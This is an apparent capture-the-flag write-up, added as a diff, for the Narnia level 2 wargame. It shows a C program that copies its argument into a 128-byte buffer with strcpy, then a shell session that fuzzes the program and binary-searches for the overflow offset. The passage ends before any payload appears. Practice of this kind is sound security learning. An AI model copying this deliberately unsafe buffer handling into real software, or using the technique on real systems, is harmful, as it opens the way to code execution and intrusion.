@@ -1,0 +1,44 @@
+And we're back in business ladies and gents!
+================= SOURCE ===================
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+int main(int argc, char * argv[]){
+	char buf[128];
+
+	if(argc == 1){
+		printf("Usage: %s argument\n", argv[0]);
+		exit(1);
+	}
+	strcpy(buf,argv[1]);
+	printf("%s", buf);
+
+	return 0;
+}
+============== FUNK FUZZ ==================
+narnia2@melinda:/narnia$ ./narnia2 $(python -c'print "A"*1024')
+AAAAAAAAAA[... many more As ...]AAAAAAAAAAAAAAAAASegmentation fault
+narnia2@melinda:/narnia$ ./narnia2 $(python -c'print "A"*512')
+Segmentation fault
+narnia2@melinda:/narnia$ ./narnia2 $(python -c'print "A"*256')
+Segmentation fault
+narnia2@melinda:/narnia$ ./narnia2 $(python -c'print "A"*128')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Alright let's use binary search to explore the distance between 128 and 256
+
+narnia2@melinda:/narnia$ ./narnia2 $(python -c'print "A"*(128+64)')
+Segmentation fault
+narnia2@melinda:/narnia$ ./narnia2 $(python -c'print "A"*(128+32)')
+Segmentation fault
+narnia2@melinda:/narnia$ ./narnia2 $(python -c'print "A"*(128+16)')
+Segmentation fault
+narnia2@melinda:/narnia$ ./narnia2 $(python -c'print "A"*(128+8)')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+narnia2@melinda:/narnia$ ./narnia2 $(python -c'print "A"*(128+12)')
+Illegal instruction
+narnia2@melinda:/narnia$ ./narnia2 $(python -c'print "A"*(128+11)')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Looks like the magic number is 128+12 so we have 12 bytes to play with
